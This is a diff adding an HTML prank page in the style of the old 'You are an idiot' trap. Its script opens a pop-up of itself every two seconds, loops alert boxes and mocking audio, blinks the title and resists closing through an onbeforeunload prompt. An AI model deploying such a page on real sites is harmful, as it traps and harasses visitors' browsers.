@@ -1,0 +1,87 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>You are an Idiot!</title>
+    <style>
+        body {
+            background-color: black;
+            color: white;
+            font-size: 50px;
+            font-family: Arial, sans-serif;
+            overflow: hidden;
+        }
+
+        h1 {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            animation: colorChange 2s infinite, float 5s ease-in-out infinite;
+        }
+
+        @keyframes colorChange {
+            0% { color: red; }
+            25% { color: yellow; }
+            50% { color: green; }
+            75% { color: blue; }
+            100% { color: purple; }
+        }
+
+        @keyframes float {
+            0% { transform: translate(0, 0); }
+            50% { transform: translate(100px, 100px); }
+            100% { transform: translate(-100px, -100px); }
+        }
+    </style>
+</head>
+<body>
+    <h1>You are an idiot!</h1>
+    <audio autoplay loop>
+        <source src="laugh.mp3" type="audio/mpeg">
+        Your browser does not support the audio element.
+    </audio>
+
+    <script>
+        // Function to create endless pop-ups loading the same site
+        function popUp() {
+            window.open(window.location.href, 'popup', 'width=400,height=400');
+        }
+
+        // Trigger pop-up every 2 seconds
+        setInterval(popUp, 2000);
+
+        // Annoying alert message loop
+        function annoyingAlerts() {
+            alert('You are an idiot!');
+            setTimeout(annoyingAlerts, 5000);
+        }
+
+        annoyingAlerts();
+
+        // Preventing the window from being closed
+        window.onbeforeunload = function() {
+            return "You really want to leave? Don't you want to stay?";
+        };
+
+        // Make the title of the page blink
+        var originalTitle = document.title;
+        setInterval(function() {
+            document.title = document.title === originalTitle ? "Haha!" : originalTitle;
+        }, 1000);
+
+        // Randomly move the <h1> element around the screen
+        function moveH1() {
+            var h1 = document.querySelector('h1');
+            var x = Math.floor(Math.random() * (window.innerWidth - h1.clientWidth));
+            var y = Math.floor(Math.random() * (window.innerHeight - h1.clientHeight));
+            h1.style.left = x + 'px';
+            h1.style.top = y + 'px';
+        }
+        
+        setInterval(moveH1, 1000); // Move the h1 text every second
+    </script>
+</body>
+</html>
